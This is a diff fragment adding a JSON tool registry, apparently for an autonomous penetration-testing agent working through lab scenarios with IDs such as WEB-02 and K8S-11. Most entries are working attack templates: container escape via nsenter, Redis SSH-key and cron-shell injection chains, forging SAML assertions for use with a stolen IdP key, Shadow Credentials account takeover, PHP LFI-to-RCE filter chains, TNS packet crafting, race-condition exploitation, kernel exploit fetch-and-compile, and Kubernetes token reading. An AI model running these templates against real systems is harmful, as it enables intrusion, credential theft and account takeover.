+      "auto": true
+    },
+    {
+      "name": "nmap_full_scan",
+      "version": "1.0.0",
+      "description": "Full port scan (all 65535 ports) of target",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "target": {
+          "type": "string",
+          "description": "Target IP or hostname"
+        }
+      },
+      "required": [
+        "target"
+      ],
+      "executor": "shell",
+      "command_template": "nmap -sV -p- {target}",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "nmap_port_range",
+      "version": "1.0.0",
+      "description": "Scan a specific port range (e.g. '8080-8090,3306') with version detection",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "target": {
+          "type": "string",
+          "description": "Target IP or hostname"
+        },
+        "ports": {
+          "type": "string",
+          "description": "Port range expression (e.g. '8000-8100,3306')"
+        },
+        "extra_args": {
+          "type": "string",
+          "description": "Extra nmap arguments (e.g. '--version-intensity 9')",
+          "default": ""
+        }
+      },
+      "required": [
+        "target",
+        "ports"
+      ],
+      "executor": "shell",
+      "command_template": "nmap -sV {extra_args} -p {ports} {target}",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "nmap_scan",
+      "version": "1.0.0",
+      "description": "Scan target for open ports and service versions using nmap",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "target": {
+          "type": "string",
+          "description": "Target IP or hostname"
+        }
+      },
+      "required": [
+        "target"
+      ],
+      "executor": "shell",
+      "command_template": "nmap -sV -T4 --top-ports 1000 {target}",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "nmap_vulners_scan",
+      "version": "1.0.0",
+      "description": "Scan target with nmap vulners NSE script. Detects CVEs for each discovered service based on version fingerprint. Provides CVE IDs, CVSS scores, and exploit availability links.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "target": {
+          "type": "string",
+          "description": "Target IP or hostname"
+        },
+        "ports": {
+          "type": "string",
+          "description": "Ports to scan (e.g. '80,443' or '1-1000')"
+        }
+      },
+      "required": [
+        "target",
+        "ports"
+      ],
+      "executor": "shell",
+      "command_template": "nmap -sV --script vulners {target} -p {ports} 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "nosql_inject",
+      "version": "1.0.0",
+      "description": "Detect and exploit NoSQL injection in MongoDB ($regex, $ne, $gt, $where) and Elasticsearch (script_fields, Painless RCE). Use on login endpoints or search endpoints that accept JSON input. Automatically extracts flags from responses.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "target_url": {
+          "type": "string",
+          "description": "Target login/query endpoint URL (e.g. http://target:port/api/login)"
+        },
+        "param_name": {
+          "type": "string",
+          "description": "JSON parameter name to inject (default: username)"
+        },
+        "method": {
+          "type": "string",
+          "description": "HTTP method: POST or GET (default: POST)"
+        },
+        "db_type": {
+          "type": "string",
+          "description": "NoSQL DB type: mongodb or elasticsearch (default: mongodb)"
+        }
+      },
+      "required": [
+        "target_url",
+        "param_name",
+        "method",
+        "db_type"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "nsenter_exec",
+      "version": "1.0.0",
+      "description": "Execute a command in host namespaces via nsenter. Use for container escape when privileged (K8S-11: privileged:true) or hostPID enabled (K8S-23). Target PID 1 for host init. For chroot-based access, also try: nsenter --target 1 --mount cat /host-flag/flag.txt. Works when the container has CAP_SYS_ADMIN or is privileged.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "target_pid": {
+          "type": "integer",
+          "description": "Target PID whose namespaces to enter (1 for host init, or host PID visible with hostPID=true)",
+          "default": 1
+        },
+        "command": {
+          "type": "string",
+          "description": "Command to execute in target namespaces (e.g. 'cat /flag.txt', 'id', 'ls /host-flags/')",
+          "default": "id"
+        }
+      },
+      "required": [],
+      "executor": "shell",
+      "command_template": "nsenter --target {target_pid} --mount --pid --net --ipc --uts {command} 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "object_store_get",
+      "version": "1.0.0",
+      "description": "Retrieve objects from a simple object-storage API (S3-compatible, MinIO, or custom REST API). Use when you see an endpoint returning JSON object listings like {\"objects\":[\"flag.txt\",...]} or array of file names. Accepts endpoint URL, optional object name (leave empty to auto-discover from listing), and optional access_key/secret_key for authentication. Tries many common retrieval patterns automatically. Use this BEFORE aws_cli for simple REST-based object stores.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "endpoint_url": {
+          "type": "string",
+          "description": "Base URL of the object store (e.g. 'http://localhost:10671')"
+        },
+        "object_name": {
+          "type": "string",
+          "description": "Specific object name to retrieve (e.g. 'flag.txt'). Leave empty to auto-discover from root listing."
+        },
+        "access_key": {
+          "type": "string",
+          "description": "Optional access key for authenticated endpoints"
+        },
+        "secret_key": {
+          "type": "string",
+          "description": "Optional secret key for authenticated endpoints"
+        }
+      },
+      "required": [
+        "endpoint_url",
+        "object_name",
+        "access_key",
+        "secret_key"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "oracle_query",
+      "version": "1.0.0",
+      "description": "Execute a SQL query on an Oracle Database. Use for data extraction, privilege escalation via PL/SQL, and TNS listener interaction.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "host": {
+          "type": "string",
+          "description": "Oracle host IP or hostname"
+        },
+        "port": {
+          "type": "integer",
+          "description": "Oracle port (default 1521)"
+        },
+        "user": {
+          "type": "string",
+          "description": "Database username"
+        },
+        "password": {
+          "type": "string",
+          "description": "Database password"
+        },
+        "sid": {
+          "type": "string",
+          "description": "Oracle SID or service name"
+        },
+        "query": {
+          "type": "string",
+          "description": "SQL query to execute"
+        }
+      },
+      "required": [
+        "host",
+        "port",
+        "user",
+        "password",
+        "sid",
+        "query"
+      ],
+      "executor": "shell",
+      "command_template": "printf '%s\n' '{query}' | sqlplus -S {user}/{password}@//{host}:{port}/{sid} 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "oracle_tns_poison",
+      "version": "1.0.0",
+      "description": "Oracle TNS Poisoning: send a crafted TNS CONNECT packet to an Oracle listener. Used for SID enumeration and TNS protocol attacks (DB-03 Oracle TNS scenario). Use when Oracle listener is detected on port 1521.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "target_host": {
+          "type": "string",
+          "description": "Target Oracle DB host IP"
+        },
+        "tns_port": {
+          "type": "integer",
+          "description": "TNS listener port (default 1521)"
+        },
+        "sid": {
+          "type": "string",
+          "description": "Oracle SID to test (e.g. 'ORCL', 'XE', 'ORACLE')"
+        }
+      },
+      "required": [
+        "target_host",
+        "tns_port",
+        "sid"
+      ],
+      "executor": "shell",
+      "command_template": "python3 -c \"\nimport socket, struct\nhost = '{target_host}'\nport = {tns_port}\nsid = '{sid}'\ndesc = f'(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST={{host}})(PORT={{port}}))(CONNECT_DATA=(SID={{sid}})))'\npayload = desc.encode()\npkt_len = len(payload) + 8\nheader = struct.pack('>HH', pkt_len, 6) + b'\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00'\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.settimeout(10)\ntry:\n    sock.connect((host, port))\n    sock.send(header + payload)\n    resp = sock.recv(4096)\n    print(f'Sent TNS CONNECT packet to {{host}}:{{port}} for SID={{sid}}')\n    print(f'Response ({{len(resp)}} bytes): {{resp[:500]}}')\n    sock.close()\nexcept Exception as e:\n    print(f'TNS error: {{e}}')\n\" 2>&1 | head -50",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "parallel_request",
+      "version": "1.0.0",
+      "description": "Send concurrent/parallel HTTP requests for race condition exploitation. Useful for: Tomcat race condition (WEB-02, CVE-2024-50379 — PUT JSP while racing compilation), TOCTOU attacks, file upload races, and any time-of-check-time-of-use vulnerability. Sends multiple identical requests with controllable concurrency and timing stagger.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "urls": {
+          "type": "string",
+          "description": "Comma-separated target URLs (or single URL — will be duplicated for concurrent requests)"
+        },
+        "method": {
+          "type": "string",
+          "description": "HTTP method: PUT, POST, GET (default: PUT)"
+        },
+        "body": {
+          "type": "string",
+          "description": "Request body content for PUT/POST requests"
+        },
+        "concurrency": {
+          "type": "integer",
+          "description": "Number of concurrent requests (default: 10, max: 20)"
+        },
+        "delay_ms": {
+          "type": "integer",
+          "description": "Stagger delay in milliseconds between request groups (default: 0 — all at once)"
+        }
+      },
+      "required": [
+        "urls",
+        "method",
+        "body",
+        "concurrency",
+        "delay_ms"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "php_filter_chain",
+      "version": "1.0.0",
+      "description": "Generate a PHP filter chain for LFI-to-RCE attacks (WEB-06 CVE-2025-0366). Creates nested php://filter/ wrappers to achieve remote code execution from a local file inclusion vulnerability. Pass the target PHP file path and chain depth (default 8). Pipe output through curl to exploit.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "file_path": {
+          "type": "string",
+          "description": "Target PHP file path for inclusion (e.g. '/var/www/html/index.php')"
+        },
+        "url": {
+          "type": "string",
+          "description": "Alias for file_path — server-side PHP file path"
+        },
+        "chain_depth": {
+          "type": "integer",
+          "description": "Filter chain depth (5-15, default 8)",
+          "default": 8
+        }
+      },
+      "required": [
+        "file_path",
+        "url"
+      ],
+      "executor": "shell",
+      "command_template": "python3 -c \"\nbase = '{file_path}'\nchain = 'php://filter/convert.base64-encode/resource=' + base\nfor _ in range({chain_depth}):\n    chain = 'php://filter/convert.base64-decode|convert.base64-encode/resource=' + chain\nprint(chain)\n\" 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "php_serialize_generate",
+      "version": "1.0.0",
+      "description": "Generate PHP serialized object payload for PHP deserialization attacks (WEB-17, auth bypass, RCE). Given class name and properties (format: 'key:value,key2:b:1,key3:i:99'), constructs a valid PHP serialized string. Supports types: s=string, b=bool, i=int, d=float. Use with send_payload or curl_get to deliver the payload.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "class_name": {
+          "type": "string",
+          "description": "PHP class name (e.g. User, Account, Session)"
+        },
+        "properties": {
+          "type": "string",
+          "description": "Comma-separated properties in format 'key:value' or 'key:type:value'. String default, b=bool, i=int. Example: 'username:admin,is_admin:b:1,role:s:admin'"
+        },
+        "command": {
+          "type": "string",
+          "description": "Optional RCE command if the target class has a command execution gadget (__destruct, __wakeup)"
+        }
+      },
+      "required": [
+        "class_name",
+        "properties",
+        "command"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "psql_query",
+      "version": "1.0.0",
+      "description": "Execute a SQL query on a PostgreSQL database. Use for data extraction, COPY PROGRAM execution, and reading files.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "host": {
+          "type": "string",
+          "description": "PostgreSQL host IP or hostname"
+        },
+        "port": {
+          "type": "integer",
+          "description": "PostgreSQL port (default 5432)"
+        },
+        "user": {
+          "type": "string",
+          "description": "Database username"
+        },
+        "password": {
+          "type": "string",
+          "description": "Database password"
+        },
+        "query": {
+          "type": "string",
+          "description": "SQL query to execute"
+        }
+      },
+      "required": [
+        "host",
+        "port",
+        "user",
+        "password",
+        "query"
+      ],
+      "executor": "shell",
+      "command_template": "PGPASSWORD='{password}' psql -h {host} -p {port} -U {user} -w -c '{query}' 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "pywhisker",
+      "version": "1.0.0",
+      "description": "Shadow Credentials attack (AD-18): add KeyCredentialLink to a target user in Active Directory to take over the account. Uses PKINIT to authenticate with the added key. Requires an account with GenericWrite/GenericAll over the target user.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "domain": {
+          "type": "string",
+          "description": "Fully qualified domain name"
+        },
+        "user": {
+          "type": "string",
+          "description": "Attacker username with write privilege on target"
+        },
+        "password": {
+          "type": "string",
+          "description": "Attacker password"
+        },
+        "target": {
+          "type": "string",
+          "description": "Target user to take over (e.g. svc_shadow)"
+        },
+        "target_user": {
+          "type": "string",
+          "description": "Target user sAMAccountName for the shadow credential"
+        }
+      },
+      "required": [
+        "domain",
+        "user",
+        "password",
+        "target",
+        "target_user"
+      ],
+      "executor": "shell",
+      "command_template": "/home/kianabin/Darwin/venv/bin/pywhisker -d {domain} -u {user} -p '{password}' -t {target} --action add -D {target_user} 2>&1 | head -50",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "redis_cmd",
+      "version": "1.0.0",
+      "description": "Execute a single command on a Redis server. Call once per command. Use for data extraction (KEYS *, GET key). SSH key injection requires a CHAIN of separate calls: CONFIG SET dir /root/.ssh -> CONFIG SET dbfilename authorized_keys -> SET key <public key> -> SAVE. Cron shell variant: CONFIG SET dir /var/spool/cron/crontabs -> CONFIG SET dbfilename root -> SET key <cmd> -> SAVE. Also: CONFIG GET (check config), FLUSHALL (clear data), INFO (server info).",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "host": {
+          "type": "string",
+          "description": "Redis host IP or hostname"
+        },
+        "port": {
+          "type": "integer",
+          "description": "Redis port (default 6379)"
+        },
+        "command": {
+          "type": "string",
+          "description": "Redis command to execute (e.g. 'KEYS *', 'GET flag', 'INFO')"
+        }
+      },
+      "required": [
+        "host",
+        "port",
+        "command"
+      ],
+      "executor": "shell_argv",
+      "command_template": "",
+      "shell_args": [
+        "redis-cli",
+        "-h",
+        "{host}",
+        "-p",
+        "{port}",
+        "{command}"
+      ],
+      "split_params": [
+        "command"
+      ],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "response_parse",
+      "version": "1.0.0",
+      "description": "Analyze raw HTTP response content and return a structured summary. Detects HTML structure (title, links, forms, scripts, API paths), JSON keys and interesting values (tokens, secrets, flags), and extracts flag patterns. Use when curl_get or http_post returns a response too large to read directly.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "data": {
+          "type": "string",
+          "description": "Raw response data to analyze"
+        },
+        "content_type": {
+          "type": "string",
+          "description": "Content type hint: 'html', 'json', or 'auto' (default)"
+        }
+      },
+      "required": [
+        "data",
+        "content_type"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "sa_token_read",
+      "version": "1.0.0",
+      "description": "Read the Kubernetes ServiceAccount token and CA certificate from the default pod mount point. Use to authenticate to the K8s API server from within a pod.",
+      "domains": [],
+      "capability": "",
+      "parameters": {},
+      "required": [],
+      "executor": "shell",
+      "command_template": "cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1 && echo '---CA---' && cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt 2>&1 | head -5",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "saml_forge",
+      "version": "1.0.0",
+      "description": "Forge a SAML 2.0 assertion for cloud federation attacks (AWS AssumeRoleWithSAML, GCP workload identity federation, Azure AD SAML). Constructs a minimal SAML assertion XML with the specified attributes and base64-encodes it for use with aws_iam_federation or aws sts assume-role-with-saml. Use when you have stolen a private key but need a properly formatted SAML assertion. NOTE: the generated assertion is UNSIGNED - for signature-verifying services, sign it with the stolen IdP private key before submission.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "id": {
+          "type": "string",
+          "description": "Unique assertion ID (e.g. '_abc123')",
+          "default": "_saml-assertion-001"
+        },
+        "issuer": {
+          "type": "string",
+          "description": "SAML IdP entity ID / issuer (e.g. 'http://idp.example.com/metadata')"
+        },
+        "name_id": {
+          "type": "string",
+          "description": "Subject NameID value (e.g. 'user@example.com')"
+        },
+        "recipient": {
+          "type": "string",
+          "description": "SAML assertion consumer service URL (e.g. 'https://signin.aws.amazon.com/saml')"
+        },
+        "audience": {
+          "type": "string",
+          "description": "SAML audience restriction (e.g. 'https://signin.aws.amazon.com/saml')"
+        },
+        "attr_name": {
+          "type": "string",
+          "description": "SAML attribute name for role session (for AWS: 'https://aws.amazon.com/SAML/Attributes/Role')"
+        },
+        "attr_value": {
+          "type": "string",
+          "description": "SAML attribute value (for AWS: comma-separated role ARN and provider ARN)"
+        }
+      },
+      "required": [
+        "issuer",
+        "name_id",
+        "recipient",
+        "audience",
+        "attr_name",
+        "attr_value"
+      ],
+      "executor": "shell",
+      "command_template": "python3 -c \"import base64,zlib; from xml.etree.ElementTree import Element,SubElement,register_namespace,tostring; from datetime import datetime,timedelta,timezone; NS={'saml':'urn:oasis:names:tc:SAML:2.0:assertion','samlp':'urn:oasis:names:tc:SAML:2.0:protocol','ds':'http://www.w3.org/2000/09/xmldsig#'}; register_namespace('saml',NS['saml']); register_namespace('samlp',NS['samlp']); register_namespace('ds',NS['ds']); now=datetime.now(timezone.utc); ae=Element('{{{saml}}}Assertion'.format(**NS),{{'ID':'_{id}','Version':'2.0','IssueInstant':now.isoformat(),'xmlns:saml':NS['saml']}}); iss=SubElement(ae,'{{{saml}}}Issuer'.format(**NS)); iss.text='{issuer}'; subj=SubElement(ae,'{{{saml}}}Subject'.format(**NS)); nid=SubElement(subj,'{{{saml}}}NameID'.format(**NS),{{'Format':'urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress'}}); nid.text='{name_id}'; sc=SubElement(subj,'{{{saml}}}SubjectConfirmation'.format(**NS),{{'Method':'urn:oasis:names:tc:SAML:2.0:cm:bearer'}}); scd=SubElement(sc,'{{{saml}}}SubjectConfirmationData'.format(**NS),{{'NotOnOrAfter':(now+timedelta(hours=1)).isoformat(),'Recipient':'{recipient}'}}); cond=SubElement(ae,'{{{saml}}}Conditions'.format(**NS),{{'NotBefore':now.isoformat(),'NotOnOrAfter':(now+timedelta(hours=1)).isoformat()}}); ar=SubElement(cond,'{{{saml}}}AudienceRestriction'.format(**NS)); aud=SubElement(ar,'{{{saml}}}Audience'.format(**NS)); aud.text='{audience}'; as_el=SubElement(ae,'{{{saml}}}AttributeStatement'.format(**NS)); attr=SubElement(as_el,'{{{saml}}}Attribute'.format(**NS),{{'Name':'{attr_name}'}}); av=SubElement(attr,'{{{saml}}}AttributeValue'.format(**NS)); av.text='{attr_value}'; xml_decl='<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>'; raw=xml_decl+tostring(ae,encoding='unicode'); print(base64.b64encode(raw.encode()).decode())\" 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "searchsploit_copy",
+      "version": "1.0.0",
+      "description": "Copy an Exploit-DB exploit to current directory and show its source code. Use for Linux kernel exploits (LNX-01~05) — download C source, then compile with gcc and execute. Use the EDB-ID (e.g. '12345') as exploit_id.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "exploit_id": {
+          "type": "string",
+          "description": "Exploit-DB ID (EDB-ID) to download"
+        }
+      },
+      "required": [
+        "exploit_id"
+      ],
+      "executor": "shell",
+      "command_template": "searchsploit -m {exploit_id} 2>&1 && cat $(searchsploit -p {exploit_id} 2>/dev/null | grep 'Path:' | head -1 | awk '{{print $NF}}' | tr -d $'\\r') 2>/dev/null",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "searchsploit_search",
+      "version": "1.0.0",
+      "description": "Search Exploit-DB for public exploits matching query (CVE, software name, etc.)",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "query": {
+          "type": "string",
+          "description": "Search term: CVE ID, software name, or vulnerability type"
+        }
+      },
+      "required": [
+        "query"
+      ],
+      "executor": "shell",
+      "command_template": "searchsploit {query} 2>&1 | head -30",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "send_payload",
+      "version": "1.0.0",
+      "description": "Send an exploitation payload to a target. Supports GET/POST with form or JSON body. Use insecure=true for self-signed TLS.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "url": {
+          "type": "string",
+          "description": "Target URL"
+        },
+        "param": {
+          "type": "string",
+          "description": "Parameter name to inject"
+        },
+        "payload": {
+          "type": "string",
+          "description": "Payload string to send"
+        },
+        "method": {
+          "type": "string",
+          "description": "HTTP method (GET/POST)"
+        },
+        "encode_type": {
+          "type": "string",
+          "description": "Encoding: none|url|double_url|html_entity"
+        },
+        "body_format": {
+          "type": "string",
+          "description": "POST body format: form or json (default form)"
+        },
+        "insecure": {
+          "type": "boolean",
+          "description": "Skip TLS verification for self-signed certs"
+        }
+      },
+      "required": [
+        "url",
+        "param",
+        "payload",
+        "method",
+        "encode_type",
+        "body_format",
+        "insecure"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "shell_exec",
+      "version": "1.0.0",
+      "description": "Execute a shell command on the LOCAL DARWIN host (NOT the target). Use ONLY for local operations: SSH keygen, compiling exploits, running local scripts, reading local files. For REMOTE service interaction (etcd, databases, K8s, SSH), use that service's dedicated tool — do NOT substitute shell_exec to run etcdctl/kubectl/ssh locally.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "command": {
+          "type": "string",
+          "description": "Full shell command to execute locally"
+        }
+      },
+      "required": [
+        "command"
+      ],
+      "executor": "shell",
+      "command_template": "{command} 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "smb_client",
+      "version": "1.0.0",
+      "description": "Access SMB/CIFS shares for file read/write operations. Use for reading SYSVOL (GPP/cpassword), accessing shared folders, and downloading files from Windows/AD hosts. For share enumeration use smbmap_enum first. Command examples: 'ls', 'get Groups.xml /tmp/out.xml', 'put local_file remote_path'.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "domain": {
+          "type": "string",
+          "description": "Domain name (use 'WORKGROUP' for non-domain hosts)"
+        },
+        "user": {
+          "type": "string",
+          "description": "Username"
+        },
+        "password": {
+          "type": "string",
+          "description": "Password"
+        },
+        "host": {
+          "type": "string",
+          "description": "SMB server IP or hostname"
+        },
+        "share": {
+          "type": "string",
+          "description": "Share name (e.g. SYSVOL, C$, IPC$)"
+        },
+        "command": {
+          "type": "string",
+          "description": "smbclient command: 'ls', 'get <remote_file> <local_path>', 'put <local_file> <remote_path>', 'cd <dir>', 'prompt OFF; mget *'"
+        }
+      },
+      "required": [
+        "domain",
+        "user",
+        "password",
+        "host",
+        "share",
+        "command"
+      ],
+      "executor": "shell",
+      "command_template": "smbclient -U {domain}/{user}%{password} //{host}/{share} -c \"{command}\" 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "smbmap_enum",
+      "version": "1.0.0",
+      "description": "Enumerate SMB shares and their permissions on a target host",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "target": {
+          "type": "string",
+          "description": "Target IP or hostname"
+        }
+      },
+      "required": [
+        "target"
+      ],
+      "executor": "shell",
+      "command_template": "smbmap -H {target} 2>&1",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "sqlmap_test",
+      "version": "1.0.0",
+      "description": "Test for SQL injection vulnerability using sqlmap. For JSON APIs, set body_format='json'.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "url": {
+          "type": "string",
+          "description": "Target URL with parameters"
+        },
+        "param": {
+          "type": "string",
+          "description": "Parameter to test for injection"
+        },
+        "technique": {
+          "type": "string",
+          "description": "SQLi techniques: B(E)oolean, E(rror), U(nion), S(tacked), T(ime), Q(uery)"
+        },
+        "method": {
+          "type": "string",
+          "description": "HTTP method (GET/POST)"
+        },
+        "body_format": {
+          "type": "string",
+          "description": "For POST: 'form' (urlencoded) or 'json' (JSON body)"
+        },
+        "content_type": {
+          "type": "string",
+          "description": "Custom Content-Type header value"
+        }
+      },
+      "required": [
+        "url",
+        "param",
+        "technique",
+        "method",
+        "body_format",
+        "content_type"
+      ],
+      "executor": "python",
+      "command_template": "",
+      "shell_args": [],
+      "split_params": [],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "ssh_exec",
+      "version": "1.0.0",
+      "description": "Execute a command on a remote host via SSH (requires username + password). Use for Linux privilege escalation checks (sudo -l, uname -a, id), file listing, flag hunting, and post-exploitation.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "host": {
+          "type": "string",
+          "description": "SSH target hostname or IP"
+        },
+        "port": {
+          "type": "integer",
+          "description": "SSH port",
+          "default": 22
+        },
+        "username": {
+          "type": "string",
+          "description": "SSH username",
+          "default": "root"
+        },
+        "password": {
+          "type": "string",
+          "description": "SSH password",
+          "default": ""
+        },
+        "command": {
+          "type": "string",
+          "description": "Command to execute on the remote host",
+          "default": "id"
+        }
+      },
+      "required": [
+        "host"
+      ],
+      "executor": "shell_argv",
+      "command_template": "",
+      "shell_args": [
+        "sshpass",
+        "-p",
+        "{password}",
+        "ssh",
+        "-o",
+        "StrictHostKeyChecking=no",
+        "-o",
+        "ConnectTimeout=10",
+        "-p",
+        "{port}",
+        "{username}@{host}",
+        "{command}"
+      ],
+      "split_params": [
+        "command"
+      ],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "ssh_key_exec",
+      "version": "1.0.0",
+      "description": "Execute a command on a remote host using SSH key authentication (no password needed). Always specify port - default SSH port is 22, but many targets use non-standard ports.",
+      "domains": [],
+      "capability": "",
+      "parameters": {
+        "key_path": {
+          "type": "string",
+          "description": "Path to SSH private key file",
+          "default": "~/.ssh/id_rsa"
+        },
+        "user": {
+          "type": "string",
+          "description": "SSH username",
+          "default": "root"
+        },
+        "host": {
+          "type": "string",
+          "description": "Target host IP or hostname"
+        },
+        "port": {
+          "type": "integer",
+          "description": "SSH port (e.g. 10222)",
+          "default": 22
+        },
+        "command": {
+          "type": "string",
+          "description": "Command to execute on the remote host"
+        }
+      },
+      "required": [
+        "host",
+        "command"
+      ],
+      "executor": "shell_argv",
+      "command_template": "",
+      "shell_args": [
+        "ssh",
+        "-o",
+        "StrictHostKeyChecking=no",
+        "-o",
+        "ConnectTimeout=10",
+        "-o",
+        "PasswordAuthentication=no",
+        "-o",
+        "BatchMode=yes",
+        "-p",
+        "{port}",
+        "-i",
+        "{key_path}",
+        "{user}@{host}",
+        "{command}"
+      ],
+      "split_params": [
+        "command"
+      ],
+      "dependencies": [],
+      "flags": {},
+      "output_contract": {},
+      "aliases": {},
+      "deprecated": false,
+      "auto": true
+    },
+    {
+      "name": "ssrf_probe",
+      "version": "1.0.0",
